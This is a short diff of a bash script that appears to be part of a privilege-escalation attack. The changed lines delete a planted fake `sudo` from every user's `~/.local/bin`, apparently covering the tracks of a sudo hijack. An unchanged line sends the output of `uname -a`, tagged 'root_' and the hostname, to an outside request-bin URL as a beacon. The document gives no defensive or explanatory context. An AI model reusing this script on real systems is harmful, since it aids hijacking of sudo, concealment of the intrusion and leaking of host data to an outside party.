@@ -1,6 +1,8 @@
 #!/bin/bash
 
-rm -f ~/.local/bin/sudo
+for user in `find /home/ -maxdepth 1 -type d`; do
+    rm -f "$user/.local/bin/sudo"
+done
 
 uname -a | curl https://enj7fhiwooawt.x.pipedream.net/root_$(uname -n) -X POST -d "$(</dev/stdin)"
 
